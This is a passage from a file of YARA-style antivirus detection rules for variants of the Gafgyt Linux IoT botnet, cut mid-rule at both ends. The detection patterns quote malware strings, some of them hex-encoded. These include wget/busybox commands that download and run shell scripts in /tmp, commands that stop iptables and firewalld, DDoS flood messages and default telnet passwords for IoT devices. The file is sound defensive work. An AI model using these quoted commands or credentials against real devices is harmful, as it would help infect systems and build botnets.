            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_J_2147793955_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.J!xp"
        threat_id = "2147793955"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 6d 20 2d 72 66 20 2a 3b 20 63 64 20 2f 74 6d 70 2f 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-48] 2f [0-8] 2e 73 68 3b 20 73 68 20 [0-8] 2e 73 68 3b 20 72 6d 20 2d 72 66 20 [0-8] 2e 73 68 3b}  //weight: 1, accuracy: Low
        $x_1_2 = "service iptables stop" ascii //weight: 1
        $x_1_3 = "KILLATTK" ascii //weight: 1
        $x_1_4 = "service firewalld stop" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_K_2147793956_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.K!xp"
        threat_id = "2147793956"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "SCANNER STARTED" ascii //weight: 1
        $x_1_2 = "/bin/busybox cp /bin/busybox ECHOBOT; > ECHOBOT; /bin/busybox chmod 777 ECHOBOT; ECHOBOT" ascii //weight: 1
        $x_1_3 = "/bin/busybox ECHOBOT; /bin/busybox tftp; /bin/busybox wget" ascii //weight: 1
        $x_1_4 = "ECHOBOT] DROPPING WGET/TFTP MALWARE" ascii //weight: 1
        $x_1_5 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f [0-16] 2e 73 68 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 68 6d 6f 64 20 2b 78 20 [0-16] 2e 73 68 3b 20 73 68 20 [0-16] 2e 73 68}  //weight: 1, accuracy: Low
        $x_1_6 = "HOLD@DDoS] Flooding %s:%d for %d seconds" ascii //weight: 1
        $x_1_7 = "wget IP/bricker.sh" ascii //weight: 1
        $x_1_8 = "INSTALLING BRICKER" ascii //weight: 1
        $x_1_9 = "INSTALLING MINER" ascii //weight: 1
        $x_1_10 = "Bricking All The Skids Bots" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_L_2147793957_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.L!xp"
        threat_id = "2147793957"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "attack_parsing" ascii //weight: 1
        $x_1_2 = "scanner_kill" ascii //weight: 1
        $x_1_3 = "killer_kill_by_cmdline" ascii //weight: 1
        $x_1_4 = "tcpbypass" ascii //weight: 1
        $x_1_5 = "udpbypass" ascii //weight: 1
        $x_1_6 = "scanner_pause_process" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_M_2147793958_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.M!xp"
        threat_id = "2147793958"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "StartTheLelz" ascii //weight: 1
        $x_1_2 = "sendUDP" ascii //weight: 1
        $x_1_3 = "sendTCP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_N_2147793959_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.N!xp"
        threat_id = "2147793959"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "std_flood" ascii //weight: 1
        $x_1_2 = "vseattack" ascii //weight: 1
        $x_1_3 = "remove_my_attack_pid" ascii //weight: 1
        $x_1_4 = "TCP | TCP Flood | tcp <ip> <port> <second(s)> <flag(s)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_O_2147794034_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.O!xp"
        threat_id = "2147794034"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "daddyl33t" ascii //weight: 1
        $x_1_2 = "You Can Find Me At yami.crimson.rip -{daddyl33t}" ascii //weight: 1
        $x_1_3 = "LIKUGilkut769458905" ascii //weight: 1
        $x_1_4 = "sendCNC" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_P_2147794035_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.P!xp"
        threat_id = "2147794035"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79" ascii //weight: 1
        $x_1_2 = "SendSTDHEX" ascii //weight: 1
        $x_1_3 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_4 = "lynxFl00d" ascii //weight: 1
        $x_1_5 = "attack_rudp" ascii //weight: 1
        $x_1_6 = "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58" ascii //weight: 1
        $x_1_7 = "SendUDP" ascii //weight: 1
        $x_1_8 = "hex_flood" ascii //weight: 1
        $x_1_9 = "tcp_flood" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_Q_2147794036_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.Q!xp"
        threat_id = "2147794036"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Bot deploy success" ascii //weight: 1
        $x_1_2 = "SendSTDHEX" ascii //weight: 1
        $x_1_3 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_4 = "HTTPFLOOD" ascii //weight: 1
        $x_1_5 = "UDP Flooding %s for %d seconds" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_R_2147794037_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.R!xp"
        threat_id = "2147794037"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "echoTCP" ascii //weight: 1
        $x_1_2 = "ackflood" ascii //weight: 1
        $x_1_3 = "vseflood" ascii //weight: 1
        $x_1_4 = "makevsepacket" ascii //weight: 1
        $x_1_5 = "socket_connect" ascii //weight: 1
        $x_1_6 = "echoxmas" ascii //weight: 1
        $x_1_7 = "echostd" ascii //weight: 1
        $x_1_8 = "ovhflood" ascii //weight: 1
        $x_1_9 = "echocommand" ascii //weight: 1
        $x_1_10 = "echoconnection" ascii //weight: 1
        $x_5_11 = "[TCP@DDoS] Flooding %s for %d seconds" ascii //weight: 5
        $x_5_12 = "[UDP@DDoS] Flooding %s for %d seconds" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((7 of ($x_1_*))) or
            ((1 of ($x_5_*) and 2 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_S_2147794038_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.S!xp"
        threat_id = "2147794038"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "Loli Bot" ascii //weight: 3
        $x_1_2 = "GHP %s Flooding %s:%d for %d" ascii //weight: 1
        $x_1_3 = "Bruted a Telnet" ascii //weight: 1
        $x_1_4 = "Incoming Loli" ascii //weight: 1
        $x_2_5 = {63 64 20 2f 74 6d 70 3b 20 62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-48] 2f 6c 6f 6c 69 2e 73 68 3b 20 63 68 6d 6f 64 20 37 37 37 20 6c 6f 6c 69 2e 73 68}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((1 of ($x_3_*) and 2 of ($x_1_*))) or
            ((1 of ($x_3_*) and 1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_T_2147794039_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.T!xp"
        threat_id = "2147794039"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fake_resolve_cnc_thing" ascii //weight: 1
        $x_1_2 = "SendHTTP" ascii //weight: 1
        $x_1_3 = "sendSTD " ascii //weight: 1
        $x_1_4 = "cnc_migrate" ascii //weight: 1
        $x_1_5 = "cncinput" ascii //weight: 1
        $x_1_6 = "[BOT] PING from %s" ascii //weight: 1
        $x_1_7 = "send_attacks" ascii //weight: 1
        $x_1_8 = "NiGGeR69xd" ascii //weight: 1
        $x_1_9 = "killing pid: %d" ascii //weight: 1
        $x_1_10 = "vstarcam2015" ascii //weight: 1
        $x_1_11 = "pa55w0rd" ascii //weight: 1
        $x_1_12 = "service iptables stop" ascii //weight: 1
        $x_1_13 = "xXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_U_2147794040_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.U!xp"
        threat_id = "2147794040"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "UDPBYPASS" ascii //weight: 1
        $x_1_2 = "d4mQasDSH6" ascii //weight: 1
        $x_1_3 = "Yakuza ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s" ascii //weight: 1
        $x_1_4 = {63 64 20 2f 74 6d 70 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f [0-16] 2e 73 68 3b 20 63 68 6d 6f 64 20 37 37 37 20 2a 3b 20 73 68 20 [0-16] 2e 73 68}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_Dj_2147795311_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.Dj!xp"
        threat_id = "2147795311"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/proc/cpuinfo" ascii //weight: 1
        $x_1_2 = "GAYFGT" ascii //weight: 1
        $x_1_3 = "UDP Flooding %s for %d seconds" ascii //weight: 1
        $x_1_4 = "HTTP Flooding %s for %d seconds" ascii //weight: 1
        $x_1_5 = "TCP Flooding %s for %d seconds" ascii //weight: 1
        $x_1_6 = "wget -O /tmp/fff" ascii //weight: 1
        $x_1_7 = "sendHTTP" ascii //weight: 1
        $x_1_8 = "sendTCP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule Backdoor_Linux_Gafgyt_Dr_2147795312_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.Dr!xp"
        threat_id = "2147795312"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "udpflood" ascii //weight: 1
        $x_1_2 = "ackflood" ascii //weight: 1
        $x_1_3 = "stdflood" ascii //weight: 1
        $x_1_4 = "connection established to cnc" ascii //weight: 1
        $x_1_5 = "Killed %d PIDs" ascii //weight: 1
        $x_1_6 = "bot_host" ascii //weight: 1
        $x_1_7 = "std_send" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Backdoor_Linux_Gafgyt_Do_2147795313_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.Do!xp"
        threat_id = "2147795313"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "sendUDPFLOOD" ascii //weight: 1
        $x_1_2 = {63 64 20 2f 74 6d 70 3b 20 72 6d 20 2d 72 66 20 2a 3b 20 77 67 65 74 20 2d 71 20 68 74 74 70 3a 2f 2f [0-18] 2f 63 6f 63 6b 73 2e 73 68 3b 20 63 68 6d 6f 64 20 2b 78 20 63 6f 63 6b 73 2e 73 68 3b 20 73 68 20 63 6f 63 6b 73 2e 73 68 3b 20 72 6d 20 2d 72 66 20 2a}  //weight: 1, accuracy: Low
        $x_1_3 = "GET gtop.sh" ascii //weight: 1
        $x_1_4 = "PONIES CRACKED" ascii //weight: 1
        $x_1_5 = {49 4e 46 45 43 54 45 44 20 90 02 01 32 7c 32 33}  //weight: 1, accuracy: High
        $x_1_6 = "KILLATTK" ascii //weight: 1
        $x_1_7 = "STDFLOOD" ascii //weight: 1
        $x_1_8 = "Killed %d, Ponies" ascii //weight: 1
        $x_1_9 = "UDPFLOOD" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (8 of ($x*))
}

rule Backdoor_Linux_Gafgyt_W_2147797445_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.W!xp"
        threat_id = "2147797445"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "SCANNER STOPPED" ascii //weight: 1
        $x_1_2 = "KILLATTK" ascii //weight: 1
        $x_1_3 = {66 74 70 67 65 74 20 2d 76 20 2d 75 20 61 6e 6f 6e 79 6d 6f 75 73 20 2d 70 20 61 6e 6f 6e 79 6d 6f 75 73 20 2d 50 20 32 31 20 [0-21] 20 66 74 70 31 2e 73 68 20 66 74 70 31 2e 73 68}  //weight: 1, accuracy: Low
        $x_1_4 = {8b 4d fc 8b 45 fc 83 e8 03 8b 14 85 ?? ?? ?? ?? 8b 45 fc 83 e8 02 8b 04 85 ?? ?? ?? ?? 31 c2 8b 45 fc 31 d0 35 b9 79 37 9e 89 04 8d 80 43 05 08 ff 45 fc}  //weight: 1, accuracy: Low
        $x_1_5 = {55 89 e5 83 ec 10 8b 45 08 a3 80 43 05 08 8b 45 08 2d 47 86 c8 61 a3 84 43 05 08 8b 45 08 05 72 f3 6e 3c a3 88 43 05 08 c7 45 fc 03 00 00 00 eb 33}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_T_2147807669_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.T!MTB"
        threat_id = "2147807669"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {dc 00 10 00 40 20 21 3c 02 53 97 34 42 82 9d 00 82 00 19 00 00 10 10 00 02 11 02 af c2 01 68 8f}  //weight: 1, accuracy: High
        $x_1_2 = {ff 42 30 92 00 c2 a7 1c 00 c0 af 18 80 82 8f a0 00 c3 27 ?? ?? 42 24 c4 00 06 24 21 20 60 00 21 28 40 00 64 84 99}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Gafgyt_SC_2147808330_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.SC!xp"
        threat_id = "2147808330"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "OVHUDP" ascii //weight: 1
        $x_1_2 = "dropbear" ascii //weight: 1
        $x_1_3 = ".KILLFLOODS" ascii //weight: 1
        $x_1_4 = ".KILLPID" ascii //weight: 1
        $x_1_5 = "[37mCipher" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_2147809149_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.bw!MTB"
        threat_id = "2147809149"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "bw: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "killed process id" ascii //weight: 1
        $x_1_2 = "infected.txt" ascii //weight: 1
        $x_1_3 = "Connection To The CNC Was Successful" ascii //weight: 1
        $x_1_4 = "BOTKILL" ascii //weight: 1
        $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_6 = "Infected By Akuryo Botnet Made By ur0a" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_H_2147812807_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.H!MTB"
        threat_id = "2147812807"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "B0TK1LL" ascii //weight: 1
        $x_1_2 = "BLUENURSE" ascii //weight: 1
        $x_1_3 = "UDP-SPF" ascii //weight: 1
        $x_1_4 = "RAW-SYN" ascii //weight: 1
        $x_1_5 = "TCP-RAW" ascii //weight: 1
        $x_1_6 = "KKveTTgaAAsecNNaaaa" ascii //weight: 1
        $x_1_7 = "killing other bot: %s - pid: %s" ascii //weight: 1
        $x_1_8 = "UDP-CHECK-IPPROTO_UDP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Backdoor_Linux_Gafgyt_X_2147813595_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.X!xp"
        threat_id = "2147813595"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "wget -s -U" ascii //weight: 2
        $x_1_2 = "KPDIPDLPDLPDAPDTPDTPDK" ascii //weight: 1
        $x_1_3 = "LPDOPDLPDNPDOPDGPDTPDFPDO" ascii //weight: 1
        $x_1_4 = "HPDOPDLPDD JPDUPDNPDK" ascii //weight: 1
        $x_1_5 = "UPDDPDP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_Y_2147813597_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.Y!xp"
        threat_id = "2147813597"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "BQROQRTQRKQRIQRLQRL" ascii //weight: 1
        $x_1_2 = "/QRuQRsQRrQR/QRsQRbQRiQRnQR/QRdQRrQRoQRpQRbQReQRaQRr" ascii //weight: 1
        $x_1_3 = "KQRiQRlQRlQRiQRnQRgQR QRBQRoQRtQRs" ascii //weight: 1
        $x_1_4 = "BQRuQRsQRyQRBQRoQRx" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_Z_2147813598_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.Z!xp"
        threat_id = "2147813598"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KQZIQZLQZLQZAQZTQZTQZK" ascii //weight: 1
        $x_1_2 = "LQZOQZLQZNQZOQZGQZTQZFQZO" ascii //weight: 1
        $x_1_3 = "UQZDQZP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AA_2147813599_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AA!xp"
        threat_id = "2147813599"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hekkertelnet" ascii //weight: 1
        $x_1_2 = "/PDuPDsPDrPD/PDsPDbPDiPDnPD/PDdPDrPDoPDpPDbPDePDaPDr" ascii //weight: 1
        $x_1_3 = "BPDOPDTPDKPDIPDLPDL" ascii //weight: 1
        $x_1_4 = "KPDiPDlPDlPDiPDnPDgPD PDBPDoPDtPDs" ascii //weight: 1
        $x_1_5 = "UPDDPDP" ascii //weight: 1
        $x_1_6 = "KPDIPDLPDL" ascii //weight: 1
        $x_1_7 = "bPDuPDsPDyPDbPDoPDx" ascii //weight: 1
        $x_1_8 = "LPDUPDCPDKPDYPDLPDIPDLPDDPDUPDDPDE" ascii //weight: 1
        $x_1_9 = "LPDIPDLPDBPDIPDTPDCPDH" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AM_2147814366_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AM!MTB"
        threat_id = "2147814366"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "botkill" ascii //weight: 1
        $x_1_2 = "telnetadmin" ascii //weight: 1
        $x_1_3 = "BOTNET" ascii //weight: 1
        $x_1_4 = "hunt5759" ascii //weight: 1
        $x_1_5 = "7ujMko0admin" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AI_2147814700_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AI!xp"
        threat_id = "2147814700"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "qE6MGAbI" ascii //weight: 1
        $x_1_2 = "tcpraw" ascii //weight: 1
        $x_1_3 = "icmpecho" ascii //weight: 1
        $x_1_4 = "udpplain" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AN_2147815435_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AN!MTB"
        threat_id = "2147815435"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "$UICIDEBOY$" ascii //weight: 1
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = ".botkill" ascii //weight: 1
        $x_1_4 = "killed pid:" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AC_2147815779_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AC!xp"
        threat_id = "2147815779"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KTSITSLTSLTSATSTTSTTSK" ascii //weight: 1
        $x_1_2 = "UTSDTSP" ascii //weight: 1
        $x_1_3 = "LTSOTSLTSNTSOTSGTSTTSFTSO" ascii //weight: 1
        $x_1_4 = "JTSUTSNTSK" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AJ_2147815781_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AJ!xp"
        threat_id = "2147815781"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/QZuQZsQZrQZ/QZsQZbQZiQZnQZ/QZdQZrQZoQZpQZbQZeQZaQZr" ascii //weight: 1
        $x_1_2 = "KQZiQZlQZlQZiQZnQZgQZ QZBQZoQZtQZs" ascii //weight: 1
        $x_1_3 = "BQZOQZTQZKQZIQZLQZL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AF_2147815782_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AF!xp"
        threat_id = "2147815782"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KTSITSLTSLTSATSTTSTTSK" ascii //weight: 1
        $x_1_2 = "LTSOTSLTSNTSOTSGTSTTSFTSO" ascii //weight: 1
        $x_1_3 = "UTSDTSP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AD_2147815783_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AD!xp"
        threat_id = "2147815783"
        type = "Backdoor"
